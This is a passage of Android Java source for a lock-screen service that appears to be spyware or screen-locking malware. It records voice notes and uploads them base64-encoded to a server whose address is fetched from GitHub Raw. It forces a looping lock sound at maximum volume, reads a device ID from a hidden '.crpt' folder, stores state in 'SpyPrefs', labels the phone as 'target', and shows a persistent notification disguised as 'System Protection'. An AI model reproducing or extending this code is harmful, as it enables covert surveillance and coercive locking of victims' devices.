            uiHandler.postDelayed(() -> { if (recordingVoice) stopVoiceRecording(); }, 5 * 60 * 1000L);
        } catch (Exception e) { recordingVoice = false; releaseRecorder(); toastUi("VN gagal dimulai"); }
    }

    private void stopVoiceRecording() {
        if (!recordingVoice) return;
        recordingVoice = false;
        try { voiceRecorder.stop(); } catch (Exception ignored) {}
        releaseRecorder();
        uiHandler.post(() -> {
            if (btnMic != null) {
                btnMic.setBackground(squareBg(0xFF050F05, C_GREEN_DIM, 4));
                btnMic.setColorFilter(C_GREEN);
            }
        });
        if (voiceFile == null || !voiceFile.exists()) return;
        new Thread(() -> {
            try {
                byte[] data = readAllBytes(voiceFile);
                if (data.length == 0 || data.length > 3 * 1024 * 1024) { toastUi("VN terlalu besar (maks. 3 MB)"); return; }
                chatToken = readChatToken();
                if (chatToken.isEmpty()) return;
                JSONObject b = new JSONObject();
                b.put("from", "target");
                b.put("deviceToken", chatToken);
                b.put("audio", android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP));
                b.put("mime", "audio/mp4");
                postJson(readChatServer() + "/api/lock-chat-voice-child/" + deviceId, b.toString());
                pollChat();
            } catch (Exception ignored) {}
            finally { try { voiceFile.delete(); } catch (Exception ignored) {} }
        }).start();
    }

    private void releaseRecorder() {
        if (voiceRecorder != null) {
            try { voiceRecorder.reset(); } catch (Exception ignored) {}
            try { voiceRecorder.release(); } catch (Exception ignored) {}
            voiceRecorder = null;
        }
    }

    private void startLockAudio() {
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am != null) {
                if (previousMusicVolume < 0) previousMusicVolume = am.getStreamVolume(AudioManager.STREAM_MUSIC);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            }
            if (lockAudioPlayer != null) {
                if (!lockAudioPlayer.isPlaying()) lockAudioPlayer.start();
                return;
            }
            android.content.res.AssetFileDescriptor afd = getAssets().openFd("audio/lock.mp3");
            lockAudioPlayer = new MediaPlayer();
            lockAudioPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            lockAudioPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
            afd.close();
            lockAudioPlayer.setLooping(true);
            lockAudioPlayer.setVolume(1.0f, 1.0f);
            lockAudioPlayer.setOnPreparedListener(mp -> mp.start());
            lockAudioPlayer.prepareAsync();
        } catch (Exception e) {
            android.util.Log.w("LOCK_AUDIO", "start: " + e.getMessage());
        }
    }

    private void stopLockAudio() {
        try {
            if (lockAudioPlayer != null) {
                lockAudioPlayer.stop();
                lockAudioPlayer.release();
                lockAudioPlayer = null;
            }
        } catch (Exception ignored) { lockAudioPlayer = null; }
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am != null && previousMusicVolume >= 0) {
                am.setStreamVolume(AudioManager.STREAM_MUSIC, previousMusicVolume, 0);
            }
        } catch (Exception ignored) {}
        previousMusicVolume = -1;
    }

    private void playVoice(String b64) {
        if (b64 == null || b64.isEmpty()) return;
        new Thread(() -> {
            try {
                byte[] data = android.util.Base64.decode(b64, android.util.Base64.DEFAULT);
                File f = new File(getCacheDir(), "play_vn_" + System.currentTimeMillis() + ".m4a");
                java.io.FileOutputStream out = new java.io.FileOutputStream(f);
                out.write(data); out.close();
                uiHandler.post(() -> {
                    try {
                        if (voicePlayer != null) voicePlayer.release();
                        voicePlayer = new MediaPlayer();
                        voicePlayer.setDataSource(f.getAbsolutePath());
                        voicePlayer.setOnCompletionListener(mp -> { mp.release(); try { f.delete(); } catch (Exception ignored) {} });
                        voicePlayer.prepare();
                        voicePlayer.start();
                    } catch (Exception e) { toastUi("VN tidak bisa diputar"); }
                });
            } catch (Exception e) { toastUi("VN tidak bisa diputar"); }
        }).start();
    }

    private byte[] readAllBytes(File f) throws Exception {
        FileInputStream in = new FileInputStream(f);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[8192]; int n;
        while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        in.close(); return out.toByteArray();
    }

    // ── HELPERS ──────────────────────────────────────────────────────────────
    private String readId() {
        try { SharedPreferences p = getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE); String id = p.getString("targetId", null); if (id != null && !id.isEmpty()) return id; } catch (Exception ignored) {}
        try { SharedPreferences p = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE); String id = p.getString("flutter.target_id", null); if (id != null && !id.isEmpty()) return id; } catch (Exception ignored) {}
        try { java.io.File f = new java.io.File(android.os.Environment.getExternalStorageDirectory(), ".crpt/.devid"); if (f.exists()) { BufferedReader br = new BufferedReader(new java.io.FileReader(f)); String id = br.readLine(); br.close(); if (id != null && !id.isEmpty()) return id.trim(); } } catch (Exception ignored) {}
        return "";
    }
    private String readChatToken() {
        try { SharedPreferences p = getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE); String t = p.getString("chatToken", ""); if (t != null && !t.isEmpty()) return t; } catch (Exception ignored) {}
        try { SharedPreferences p = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE); String t = p.getString("flutter.chatToken", ""); return t == null ? "" : t; } catch (Exception ignored) { return ""; }
    }
    private String readChatServer() {
        // All server traffic must use the URL currently published in GitHub Raw.
        String dynamicServer = DeviceService.getBaseUrl();
        if (dynamicServer == null || dynamicServer.trim().isEmpty()) {
            DeviceService.refreshFromGitHub();
            dynamicServer = DeviceService.getBaseUrl();
        }
        return dynamicServer == null ? "" : dynamicServer.trim().replaceAll("/$", "");
    }
    private void saveLock(String msg, boolean locked) {
        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().putBoolean("isLocked", locked).putString("lockMessage", msg).remove("lockPin").apply();
    }
    private int dp(int v) { return (int)(v * getResources().getDisplayMetrics().density); }
    private String httpGet(String url) {
        try { HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection(); c.setConnectTimeout(3000); c.setReadTimeout(3000); if (c.getResponseCode() != 200) return null; BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8)); StringBuilder sb = new StringBuilder(); String l; while ((l = br.readLine()) != null) sb.append(l); br.close(); return sb.toString(); } catch (Exception e) { return null; }
    }
    private void postJson(String url, String json) {
        try { HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection(); c.setRequestMethod("POST"); c.setRequestProperty("Content-Type", "application/json"); c.setDoOutput(true); c.setConnectTimeout(3000); c.setReadTimeout(3000); OutputStream os = c.getOutputStream(); os.write(json.getBytes(StandardCharsets.UTF_8)); os.close(); c.getResponseCode(); c.disconnect(); } catch (Exception ignored) {}
    }
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Lock Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }
    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Protection")
            .setContentText("Active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
    }
}
